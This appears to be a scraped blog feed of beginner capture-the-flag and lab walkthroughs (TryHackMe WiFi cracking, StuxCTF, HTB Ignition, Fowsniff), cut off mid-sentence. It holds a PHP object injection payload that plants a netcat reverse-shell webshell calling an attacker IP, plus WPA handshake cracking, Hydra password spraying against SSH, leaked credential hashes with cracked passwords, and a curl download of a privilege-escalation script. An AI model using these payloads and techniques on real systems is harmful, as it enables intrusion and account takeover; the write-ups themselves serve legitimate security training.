This room goes through some of the basics of this technology before we start learning about how to attack such network setups. Let’s dig in. If you wish to follow through, check out the room on TryHackMe called WIFIHacking101\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nAn Intro to WPA # In this section, we go through some of the basics of WIFI technology by going through some terminologies. Some of the discussed terminologies are:\nWi-Fi Protected Access (WPA) is a security standard for computing devices with wireless internet connections. Very susceptible to brute force attacks. WPA2-PSK: Wifi networks that you connect to by providing a password that\u0026rsquo;s the same for everyone. Take note that PSK stands for Pre-Shared-Key and is essentially what we commonly refer to as the WIFI password. Its also important to note that it has a minimum number of characters requirement as shown below: WPA2-EAP: Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server. RADIUS: A server for authenticating clients, not just for wifi. SSID: The network \u0026ldquo;name\u0026rdquo; that you see when you try and connect. ESSID: An SSID that may apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you\u0026rsquo;re attacking. BSSID: An access point MAC (hardware) address Capturing Packets to attack # The most common tools used in WIFI hacking are found in the aircrack-ng suite which comes which consists of tools such as:\nAircrack-ng Airodump-ng Airmon-ng which mostly attack WPA(2) networks. You also need to ensure you have a monitor mode Network Interface Card (NIC) to capture the 4-way handshake used by WPA networks. If you need results fast, it is good to use injection mode, which de-authenticates a client from the WIFI and forces the handshake to re-occur as the client tries to reconnect to the network.\nMost of the commands used for tools within this suite can be found on this page. We are going to go through some of the basic ones below. But first, here is an overview and summary of things we can do to exploit WPA/WPA2 networks in a flowchart: The image above is courtesy of StationX. Note that we are not going to go through everything in this chart but just the basics. To enable monitor mode on our NIC we use the command:\nairmon-ng start wlan0 Which will give you an output like so: We can see that the interface name changes to wlan0mon. Oftentimes, there might be other processes currently using the network adapter we want to use or intend to use, therefore it’s a common practice to run this command first:\nairmon-ng check kill Which will kill all interfering processes and give you a similar output to this one: Now that our machine\u0026rsquo;s Network Interface Card(NIC) is in monitor mode, we need to capture some packets that we can use for our attack. But what tool in the suite do we use, let\u0026rsquo;s do a quick search on google: As shown above, we have a tool from the aircrack-ng suite for this exact task, the tool is called: airodump-ng Let’s have a look at its usage by viewing its help menu. We do that by running the command:\nsudo airodump-ng --help Notice the -w option or flag that writes the captured packets to a file. Scrolling down further, we notice other useful flags that we can use: The –bssid flag is used to set the BSSID to monitor and the –channel flag that sets the channel. There are many options that can be of use while working with this tool. All are listed on the help menu, which we can access using\nsudo airodump-ng –-help Let’s dive into a more practical part of it which is also the last bit. We can now assume that we managed to capture some traffic for a network that we intended to attack. In our case, we have the capturing part done for us, since we maybe don\u0026rsquo;t have a NIC that can go to monitor mode or don\u0026rsquo;t have a wireless adapter to do the capturing or injection. We are going to use a packet capture file that is provided to us, so let\u0026rsquo;s first extract it: Notice the NinjaJ-01.cap file, which is what we are going to use next to create a file that will help us crack the password. To do that, we use the command:\naircrack-ng -j wifi NinjaJc01.cap aircrack-ng: Tool from suite that we are using for this task The flag -j: flag that specifies generation of a file from the pcap file specified into one that can be used to crack the password by aircrack-ng or hashcat. wifi: name of new file to be generated if the command successfully runs. NinjaJc01.cap: The file we are generating our new file from. In the output below, notice that we now have the MAC address and Name of the WIFI network that we are trying to gain access by cracking the WIFI’s password. The command successfully executes, meaning we can move forward and attempt cracking the password. As shown below, we can see that a new file names wifi.hccapx has been generated for us to use in our next step. We can now run the command:\naircrack-ng -a2 -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt wifi.hccapx Let’s break down the command to bits:\naircrack-ng: Main command for Aircrack-ng tool usage from the main suite. The flag -a2: This option specifies the attack mode. In this case, -a2 indicates a dictionary attack. A dictionary attack involves trying each word from a provided wordlist (dictionary) to crack the passphrase. The flag -b 02:1A:11:FF:D9:BD: This option specifies the BSSID (MAC address of the access point) of the target network. The -b option is followed by the BSSID of the target network to focus the attack on a specific network. The flag -w /usr/share/wordlists/rockyou.txt: This option specifies the wordlist (dictionary) to use for the dictionary attack. wifi.hccapx: This is the name of the capture file containing the handshake packets captured from the target Wi-Fi network. Aircrack-ng uses this file as input for the cracking process. After letting this run for a while, we are now able to get the password for this WIFI as shown in the output below: With that, we are done covering the basics of WIFI hacking. It is important to know that password cracking is a resource-intensive process and therefore works faster on GPUs as opposed to CPU usage. CONCLUSION # We covered the basics of WIFI hacking by starting us off with basic terminologies that we were to hear mentions of in the walkthrough, which was a lot of interesting theory. Then gradually moved to the practical bit of the work. It was fun to interact with some of the tools within the airmon-ng suite for WIFI or wireless attacks and I hope we all learned a thing or two along the way.\n","date":"19 March 2024","externalUrl":null,"permalink":"/posts/2024-03-19-wifi-hacking-101/2024-03-19-wifi-hacking-101/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eWe all use Wi-Fi on a day-to-day basis.

It\u0026rsquo;s a method for two parties to establish a shared secret over an insecure channel. The basic concept involves:\np: A large prime number g: A generator (base) a and b: Private keys g^c: A public key The goal: Calculate the shared secret that represents our hidden directory.\nStep 5: Solving the Cryptographic Puzzle # I created a Python script to calculate the shared secret:\n#!/usr/bin/python3 # Given values from the HTML comment p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545081888689821796050434591251 g = 7 a = 330 b = 450 gc = 6091917800833598741530924081762225477418277010142022622731688158297759621329407070985497917078988781448889947074350694220209769840915705739528359582454617 # Calculate the shared secret gca = (gc**a) % p gcab = (gca**b) % p # The first 128 characters give us our directory name print(str(gcab)[:128]) Result:\n47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055 This long number is our secret directory!\nWeb Exploitation # Step 6: Accessing the Hidden Directory # Now we can access the hidden directory using our calculated path:\ncurl http://10.10.158.14/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/ Key findings in the response:\nA hint in the HTML: \u0026lt;!-- hint: /?file= --\u0026gt; This suggests a Local File Inclusion (LFI) vulnerability Step 7: Discovering the LFI Vulnerability # What is LFI?

After decoding this through multiple steps (hex decode → reverse → base64 decode), we discover the PHP source code!\nStep 8: Analyzing the Vulnerable PHP Code # The decoded PHP reveals:\n\u0026lt;?php error_reporting(0); class file { public $file = \u0026#34;dump.txt\u0026#34;; public $data = \u0026#34;dump test\u0026#34;; function __destruct(){ file_put_contents($this-\u0026gt;file, $this-\u0026gt;data); } } $file_name = $_GET[\u0026#39;file\u0026#39;]; if(isset($file_name) \u0026amp;\u0026amp; !file_exists($file_name)){ echo \u0026#34;File no Exist!\u0026#34;; } if($file_name==\u0026#34;index.php\u0026#34;){ $content = file_get_contents($file_name); $tags = array(\u0026#34;\u0026lt;?php\u0026#34;, \u0026#34;?\u0026gt;\u0026#34;); echo bin2hex(strrev(base64_encode(nl2br(str_replace($tags, \u0026#34;\u0026#34;, $content))))); } unserialize(file_get_contents($file_name)); ?\u0026gt; Critical vulnerability identified:\nThe code calls unserialize() on user-controlled input There\u0026rsquo;s a file class with a destructor that writes data to a file This is a perfect setup for PHP Object Injection! Exploitation # Step 9: Understanding PHP Object Injection # What is PHP Object Injection? When unserialize() processes malicious data, it can create objects that execute code when they\u0026rsquo;re destroyed (via __destruct() methods).\nOur attack plan:\nCreate a malicious serialized object Host it on our attack machine Make the vulnerable server download and unserialize it The destructor will write a PHP webshell to the server Step 10: Creating the Malicious Payload # Create exploit.php:\n\u0026lt;?php class file { public $file = \u0026#39;shell.php\u0026#39;; public $data = \u0026#39;\u0026lt;?php shell_exec(\u0026#34;nc -e /bin/bash 10.8.181.85 1234\u0026#34;); ?\u0026gt;\u0026#39;; } echo serialize(new file); ?\u0026gt; Generate the payload:\nphp exploit.php \u0026gt; payload.txt What this creates:\nA serialized object that, when unserialized, will create a shell.php file The file contains a reverse shell command using netcat Step 11: Hosting the Payload # Start a simple HTTP server to host our malicious payload:\npython3 -m http.server 8000 Step 12: Triggering the Vulnerability # Visit this URL to make the server download and execute our payload:\nhttp://10.10.158.14/[SECRET_DIRECTORY]/?file=http://10.8.181.85:8000/payload.txt What happens:\nServer downloads our payload.txt unserialize() creates our malicious file object When the script ends, __destruct() runs Our reverse shell code gets written to shell.php Step 13: Getting a Reverse Shell # Start a netcat listener on your machine:\nnc -lvnp 1234 Then trigger the shell by visiting:\nhttp://10.10.158.14/[SECRET_DIRECTORY]/shell.php Success! We now have a shell as the www-data user.\nPost-Exploitation # Step 14: Initial Access and User Flag # Once we have our shell, let\u0026rsquo;s explore:\n# Upgrade to a better shell python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; # Check current user whoami # Output: www-data # Look for users ls /home # Output: grecia # Get user flag cat /home/grecia/user.txt # Output: 0b6044b7807dd100b9e30f1bd09db53f Step 15: Privilege Escalation # Let\u0026rsquo;s check what sudo privileges our current user has:\nsudo -l Output:\nUser www-data may run the following commands on ubuntu: (ALL) NOPASSWD: ALL This is jackpot! The www-data user can run ANY command as root without a password.\nStep 16: Getting Root Access # # Switch to root sudo su # Get root flag cat /root/root.txt # Output: 0028454003b42601548df551b738976c Summary # We successfully compromised this machine through:\nReconnaissance: Used Nmap to discover open services Cryptography: Solved a Diffie-Hellman challenge to find a hidden directory Web Exploitation: Discovered and exploited an LFI vulnerability Object Injection: Used PHP Object Injection to achieve code execution Privilege Escalation: Leveraged overly permissive sudo configuration Key Learning Points # For Beginners: # Reconnaissance is crucial: Always start by mapping out the target\u0026rsquo;s attack surface.\nRead the source: Web applications often leak information in HTML comments and configuration files.\nUnderstand the code: Take time to analyze vulnerable code to understand exactly how exploits work.\nChain vulnerabilities: Multiple small vulnerabilities can often be combined for greater impact.\nSecurity Lessons: # Never trust user input: The unserialize() function should never process untrusted data.\nPrinciple of least privilege: The www-data user shouldn\u0026rsquo;t have unlimited sudo access.\nInput validation: All user-supplied data should be properly validated and sanitized.\nDefense in depth: Multiple security layers can prevent a single vulnerability from compromising the entire system.\nTools Used # Nmap: Network reconnaissance curl: Web requests and response analysis Python: Cryptographic calculations and payload hosting PHP: Creating malicious serialized objects Netcat: Reverse shell listener and connection CyberChef: Data decoding and analysis Conclusion # This CTF challenge demonstrates how attackers can chain together multiple techniques to achieve full system compromise. From solving cryptographic puzzles to exploiting web vulnerabilities and escalating privileges, each step builds upon the previous one.\nThe key takeaway for defenders is that security is only as strong as the weakest link. Even with cryptographic protections hiding the vulnerable directory, poor input validation and excessive privileges led to complete system compromise.\nFlags Captured:\nUser Flag: 0b6044b7807dd100b9e30f1bd09db53f Root Flag: 0028454003b42601548df551b738976c ","date":"31 August 2025","externalUrl":null,"permalink":"/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eStuxCTF - Complete Beginner\u0026rsquo;s Writeup \n    \u003cdiv id=\"stuxctf---complete-beginners-writeup\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#stuxctf---complete-beginners-writeup\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eWelcome to this step-by-step walkthrough of the StuxCTF challenge!

This walkthrough is designed for beginners who are new to penetration testing and cybersecurity.\nPrerequisites # Basic knowledge of Linux command line Understanding of what IP addresses and ports are Familiarity with web browsers Phase 1: Enumeration (Information Gathering) # What is Enumeration? # Enumeration is the process of gathering information about a target system. Think of it like reconnaissance - we\u0026rsquo;re trying to learn as much as possible about what services are running and how we might gain access.\nStep 1: Network Scanning with NMAP # What is NMAP? NMAP (Network Mapper) is a tool that scans networks to discover what services are running on different ports. Think of ports like doors on a building - each one might lead to a different service.\nThe Command:\nsudo nmap -sCV -p- -T4 10.129.1.27 Breaking Down the Command:\nsudo - Run with administrator privileges nmap - The network scanning tool -sCV - Combines two options: -sC - Run default scripts to gather more information -sV - Detect service versions -p- - Scan ALL ports (1-65535) instead of just common ones -T4 - Set timing to \u0026ldquo;aggressive\u0026rdquo; (faster scanning) 10.129.1.27 - The target IP address The Results:\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 09:58 EAT Nmap scan report for 10.129.1.27 Host is up (0.27s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://ignition.htb/ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 982.30 seconds Step 2: Understanding the Results # What We Found:\nOnly 1 open port: Port 80 (HTTP web service) Web server: nginx version 1.14.2 Important discovery: The website redirects to http://ignition.htb/ What is a Domain Name? ignition.htb is a domain name. However, our computer doesn\u0026rsquo;t know where this domain points to, so we need to tell it.\nStep 3: Adding the Domain to Our Hosts File # What is the /etc/hosts file? This file tells your computer which IP address to use when you type in a domain name. It\u0026rsquo;s like a local phone book for your computer.\nThe Command:\necho \u0026#34;10.129.1.27 ignition.htb\u0026#34; | sudo tee -a /etc/hosts Breaking Down the Command:\necho \u0026quot;10.129.1.27 ignition.htb\u0026quot; - Create the text we want to add | - Pipe (send) that text to the next command sudo tee -a /etc/hosts - Append the text to the /etc/hosts file with admin privileges Result: Now when we visit http://ignition.htb in our browser, it will go to IP address 10.129.1.27.\nPhase 2: Web Enumeration # Step 4: Exploring the Website # When we visit http://ignition.htb, we find a basic website but nothing immediately useful for gaining access.\nStep 5: Directory Brute-forcing # What is Directory Brute-forcing? This is the process of trying many different URL paths to find hidden pages or directories on a website. It\u0026rsquo;s like trying different door handles to see which ones are unlocked.\nThe Tool: FFUF FFUF (Fuzz Faster U Fool) is a web fuzzing tool that tries many different URLs quickly.\nThe Command:\nffuf -u http://ignition.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -ac -ic Breaking Down the Command:\nffuf - The fuzzing tool -u http://ignition.htb/FUZZ - The URL pattern (FUZZ gets replaced with words from our wordlist) -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt - The wordlist file containing common directory names -ac - Auto-calibrate to filter out false positives -ic - Ignore comments in wordlist The Results:\nadminuODLwsSK [Status: 200, Size: 25806, Words: 5441, Lines: 426, Duration: 610ms] contact [Status: 200, Size: 28673, Words: 6592, Lines: 504, Duration: 1205ms] home [Status: 200, Size: 25802, Words: 5441, Lines: 426, Duration: 2321ms] media [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 232ms] 0 [Status: 200, Size: 25803, Words: 5441, Lines: 426, Duration: 2441ms] static [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 283ms] catalog [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6498ms] Home [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 5820ms] admin [Status: 200, Size: 7095, Words: 1551, Lines: 149, Duration: 6566ms] cms [Status: 200, Size: 25817, Words: 5441, Lines: 426, Duration: 5820ms] Understanding HTTP Status Codes:\n200 - OK (page exists and loads successfully) 301 - Permanent redirect 302 - Temporary redirect Key Discovery: We found an /admin page!\nPhase 3: Exploitation # Step 6: Investigating the Admin Panel # When we visit http://ignition.htb/admin, we discover:\nA login page for Magento (an e-commerce platform) We need username and password credentials What is Magento? Magento is a popular e-commerce platform used to build online stores. Admin panels are where administrators manage the website.\nStep 7: Credential Guessing # The Strategy: Since we don\u0026rsquo;t have specific credentials, we can try common default passwords. Many systems are left with weak, default credentials.\nCommon Weak Passwords: Based on research into commonly used passwords, we can try combinations like:\nadmin:admin admin:password admin:123456 admin:qwerty123 Some of these are listed here: https://cybernews.com/best-password-managers/most-common-passwords/\nStep 8: Successful Login # The Breakthrough: After trying common password combinations, the credentials admin:qwerty123 successfully logged us into the Magento admin panel.\nWhy This Worked:\nMany administrators use weak, predictable passwords \u0026ldquo;qwerty123\u0026rdquo; combines the QWERTY keyboard pattern with simple numbers Default usernames like \u0026ldquo;admin\u0026rdquo; are commonly left unchanged Step 9: Finding the Flag # Once logged into the Magento admin panel, we can explore the dashboard and find the flag for this challenge.\nKey Learning Points # Security Lessons Learned # Default Credentials are Dangerous\nAlways change default usernames and passwords Use strong, unique passwords for admin accounts Information Disclosure\nThe NMAP scan revealed the web server version Directory enumeration exposed the admin panel Both pieces of information helped us focus our attack The Importance of Enumeration\nThorough reconnaissance often reveals the path to success Multiple tools (NMAP, FFUF) provide different types of information Tools We Used # NMAP - Network and port scanning FFUF - Web directory/file fuzzing Web Browser - Manual exploration and login attempts Ethical Considerations # Important Note: This type of testing should only be performed on:\nSystems you own Systems you have explicit permission to test Dedicated practice environments (like Hack The Box) Unauthorized access to computer systems is illegal in most jurisdictions.\nSummary # This challenge demonstrated a common real-world scenario where:\nPoor password practices (weak admin credentials) Information leakage (exposed admin panels) Insufficient access controls Combined to create a security vulnerability that allowed unauthorized access to the system.\nThe key takeaway is that security is only as strong as the weakest link - in this case, a predictable password on an exposed admin interface.\n","date":"30 August 2025","externalUrl":null,"permalink":"/posts/2025-08-30-ignition/2025-08-30-ignition/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eHTB Ignition - Beginner Penetration Testing Walkthrough \n    \u003cdiv id=\"htb-ignition---beginner-penetration-testing-walkthrough\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#htb-ignition---beginner-penetration-testing-walkthrough\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eWhat is This? \n    \u003cdiv id=\"what-is-this\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#what-is-this\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eThis is a step-by-step guide for solving the \u0026ldquo;Ignition\u0026rdquo; challenge from Hack The Box (HTB).

We want to find:\nWhat services are running? What ports are open? What software versions are installed? Any publicly available information about the target? Step 1: Network Scanning with Nmap # What is Nmap? Nmap (Network Mapper) is a tool that scans networks to discover hosts and services. It\u0026rsquo;s like knocking on doors to see which ones are open.\nLet\u0026rsquo;s scan our target for open ports and services:\nnmap -sV -p- 10.10.4.101 -T4 Command breakdown:\nnmap - The network scanning tool -sV - Version detection (tells us what software is running) -p- - Scan all 65,535 ports (not just common ones) 10.10.4.101 - Our target IP address -T4 - Timing template (faster scanning) Output:\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 03:31 BST Nmap scan report for ip-10-10-4-101.eu-west-1.compute.internal (10.10.4.101) Host is up (0.00044s latency).

Open a web browser and navigate to:\nhttp://10.10.4.101 You should see a website that appears to be temporarily unavailable or under maintenance.\nWhat is Directory Fuzzing? Sometimes websites have hidden directories that aren\u0026rsquo;t linked from the main page. We can try to find these using a technique called \u0026ldquo;fuzzing\u0026rdquo; - essentially guessing common directory names.\nLet\u0026rsquo;s try directory fuzzing (this won\u0026rsquo;t find much, but it\u0026rsquo;s good practice):\nffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.101/FUZZ Command breakdown:\nffuf - Fast web fuzzer -w - Wordlist to use for fuzzing -u - URL pattern (FUZZ gets replaced with words from the wordlist) Note: If you don\u0026rsquo;t have ffuf installed, install it with: sudo apt install ffuf\nPhase 2: OSINT (Open Source Intelligence) # What is OSINT? # OSINT involves gathering information from publicly available sources. Sometimes, information about our target is already available online!\nStep 3: Google Dorking Discovery # Since the website seems to be down for maintenance, let\u0026rsquo;s try searching online for information about \u0026ldquo;Fowsniff\u0026rdquo; or the company.\nWhat is Google Dorking? Google dorking uses special search operators to find specific information that might not appear in normal searches.\nIn a real scenario, you might search for:\nCompany name + \u0026ldquo;password\u0026rdquo; Company domain + \u0026ldquo;leak\u0026rdquo; Employee email addresses For this CTF, the hint leads us to a GitHub repository: https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt\nThis simulates finding a data breach dump online. Let\u0026rsquo;s examine what we found:\nStep 4: Analyzing the Password Dump # The GitHub link contains leaked user credentials in this format:\nusername@domain:password_hash Our discovered data:\nmauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 tegel@fowsniff:1dc352435fecca338acfd4be10984009 baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb seina@fowsniff:90dc16d47114aa13671c697fd506cf26 stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e What are these hashes? The long strings after the colons are password hashes. Instead of storing passwords in plain text (which would be very insecure), systems store mathematical representations called \u0026ldquo;hashes.\u0026rdquo;\nStep 5: Cracking Password Hashes # What is Hash Cracking? We need to reverse these hashes back to the original passwords. We can use online tools or offline tools like hashcat or john.\nLet\u0026rsquo;s use the online tool CrackStation (https://crackstation.net):\nCopy all the hashes (the part after the colon) Paste them into CrackStation Solve the captcha and click \u0026ldquo;Crack Hashes\u0026rdquo; Our cracked credentials:\nmauer@fowsniff:mailcall mustikka@fowsniff:bilbo101 tegel@fowsniff:apples01 baksteen@fowsniff:skyler22 seina@fowsniff:scoobydoo2 stone@fowsniff:[not cracked] mursten@fowsniff:carp4ever parede@fowsniff:orlando12 sciana@fowsniff:07011972 Let\u0026rsquo;s save these in two files for later use:\n# Create a usernames file echo -e \u0026#34;mauer\\nmustikka\\ntegel\\nbaksteen\\nseina\\nstone\\nmursten\\nparede\\nsciana\u0026#34; \u0026gt; fowsniff_usernames.txt # Create a passwords file echo -e \u0026#34;mailcall\\nbilbo101\\napples01\\nskyler22\\nscoobydoo2\\ncarp4ever\\norlando12\\n07011972\u0026#34; \u0026gt; fowsniff_passwords.txt Phase 3: Email Protocol Exploitation # What is POP3? # POP3 (Post Office Protocol 3) is an email protocol that allows email clients to retrieve emails from a mail server. Unlike IMAP, POP3 typically downloads emails to the client and removes them from the server.\nRemember our Nmap scan found POP3 running on port 110. Let\u0026rsquo;s try to access someone\u0026rsquo;s email account!\nStep 6: Connecting to the POP3 Service # What is Netcat? Netcat (nc) is a networking utility that can connect to any port. It\u0026rsquo;s like a Swiss Army knife for network connections.\nLet\u0026rsquo;s try connecting to the POP3 service with one of our cracked accounts:\nnc 10.10.4.101 110 You should see:\n+OK Welcome to the Fowsniff Corporate Mail Server! Now let\u0026rsquo;s try logging in as seina with password scoobydoo2:\nUSER seina +OK PASS scoobydoo2 +OK Logged in. Great! We\u0026rsquo;re in. Let\u0026rsquo;s see what emails are available:\nLIST +OK 2 messages: 1 1622 2 1280 . This shows there are 2 emails. Let\u0026rsquo;s read the first one:\nRETR 1 Important Email Content:\nSubject: URGENT! Security EVENT! From: stone@fowsniff (stone) Dear All, A few days ago, a malicious actor was able to gain entry to our internal email systems. The attacker was able to exploit incorrectly filtered escape characters within our SQL database to access our login credentials. Both the SQL and authentication system used legacy methods that had not been updated in some time. We have been instructed to perform a complete internal system overhaul. While the main systems are \u0026#34;in the shop,\u0026#34; we have moved to this isolated, temporary server that has minimal functionality. This server is capable of sending and receiving emails, but only locally. That means you can only send emails to other users, not to the world wide web. You can, however, access this system via the SSH protocol. The temporary password for SSH is \u0026#34;S1ck3nBluff+secureshell\u0026#34; You MUST change this password as soon as possible, and you will do so under my guidance. I saw the leak the attacker posted online, and I must say that your passwords were not very secure. Come see me in my office at your earliest convenience and we\u0026#39;ll set it up. Thanks, A.J Stone Key Discovery: We found a temporary SSH password: S1ck3nBluff+secureshell\nType QUIT to exit the POP3 session.\nPhase 4: SSH Access # What is SSH? # SSH (Secure Shell) is a protocol for securely connecting to remote computers. It\u0026rsquo;s like remote desktop, but command-line based.\nStep 7: Finding Who Still Uses the Default Password # The email mentioned that everyone should change their SSH password. Let\u0026rsquo;s see who hasn\u0026rsquo;t changed it yet using Hydra.\nWhat is Hydra? Hydra is a brute-force tool that tries multiple username/password combinations against various services.\nInstall Hydra if you don\u0026rsquo;t have it:\nsudo apt install hydra Let\u0026rsquo;s test the default SSH password against all usernames:\nhydra -L fowsniff_usernames.txt -p \u0026#39;S1ck3nBluff+secureshell\u0026#39; ssh://10.10.4.101 Command breakdown:\nhydra - The brute force tool -L - File containing usernames to try -p - Single password to test (note the quotes due to special characters) ssh://10.10.4.101 - Target service and IP Output:\nHydra v9.0 (c) 2019 by van Hauser/THC [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task [DATA] attacking ssh://10.10.4.101:22/ [22][ssh] host: 10.10.4.101 login: baksteen password: S1ck3nBluff+secureshell 1 of 1 target successfully completed, 1 valid password found Excellent! User baksteen hasn\u0026rsquo;t changed their password yet.\nStep 8: SSH Connection # Let\u0026rsquo;s connect via SSH:\nssh baksteen@10.10.4.101 Enter the password when prompted: S1ck3nBluff+secureshell\nSSH Session Output:\n_____ _ __ __ :sdddddddddddddddy+ | ___|____ _____ _ __ (_)/ _|/ _| :yNMMMMMMMMMMMMMNmhsso | |_ / _ \\ \\ /\\ / / __| \u0026#39;_ \\| | |_| |_ .sdmmmmmNmmmmmmmNdyssssso | _| (_) \\ V V /\\__ \\ | | | | _| _| -: y. dssssssso |_| \\___/ \\_/\\_/ |___/_| |_|_|_| |_| -: y. dssssssso ____ -: y. dssssssso / ___|___ _ __ _ __ -: y. dssssssso | | / _ \\| \u0026#39;__| \u0026#39;_ \\ -: o. dssssssso | |__| (_) | | | |_) | _ -: o. yssssssso \\____\\___/|_| | .__/ (_) -: .+mdddddddmyyyyyhy: |_| -: -odMMMMMMMMMMmhhdy/. .ohdddddddddddddho: Delivering Solutions **** Welcome to the Fowsniff Corporate Server! **** ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords. baksteen@fowsniff:~$ We\u0026rsquo;re in! Let\u0026rsquo;s explore:\npwd ls -la Output:\n/home/baksteen total 20 drwxr-xr-x 4 baksteen baksteen 4096 Mar 13 2018 . drwxr-xr-x 4 root root 4096 Mar 9 2018 .. -rw-r--r-- 1 baksteen baksteen 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 baksteen baksteen 3771 Sep 1 2015 .bashrc drwx------ 2 baksteen baksteen 4096 Mar 13 2018 .cache drwxr-xr-x 5 baksteen baksteen 4096 Mar 13 2018 Maildir -rw-r--r-- 1 baksteen baksteen 655 May 16 2017 .profile -rw-r--r-- 1 baksteen baksteen 78 Mar 13 2018 term.txt Let\u0026rsquo;s check the user flag:\ncat term.txt This isn\u0026rsquo;t the main flag - we need to escalate to root privileges.\nPhase 5: Privilege Escalation # What is Privilege Escalation? # Privilege escalation is the process of gaining higher-level permissions on a system. We currently have access as the user baksteen, but we want root access to get the final flag.\nStep 9: System Enumeration with LinPEAS # What is LinPEAS? LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for common privilege escalation vectors on Linux systems.\nLet\u0026rsquo;s download and run LinPEAS:\n# Download LinPEAS to the target machine curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh # Make it executable chmod +x linpeas.sh # Run it ./linpeas.sh Alternative download method if curl doesn\u0026rsquo;t work:\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh Key Finding from LinPEAS:\nInteresting GROUP writable files (not in Home) (max 200) Group users: /opt/cube/cube.sh This is interesting! Let\u0026rsquo;s investigate this file.\nStep 10: Analyzing the Writable Script # ls -la /opt/cube/cube.sh Output:\n-rw-rwxr-- 1 parede users 851 Mar 11 2018 /opt/cube/cube.sh Understanding File Permissions:\nrw- (owner: parede) - Read and write permissions rwx (group: users) - Read, write, and execute permissions r-- (others) - Read only Why is this important?\nWe are part of the users group The users group has write access to this script This script likely runs with elevated privileges Let\u0026rsquo;s see what this script does:\ncat /opt/cube/cube.sh This script appears to generate the banner we saw when logging in via SSH. If it runs as root during login, we can modify it to give us a root shell!\nStep 11: Creating a Reverse Shell # What is a Reverse Shell? A reverse shell is when the target machine connects back to our attacking machine, giving us a command prompt. This is useful because:\nIt bypasses firewall 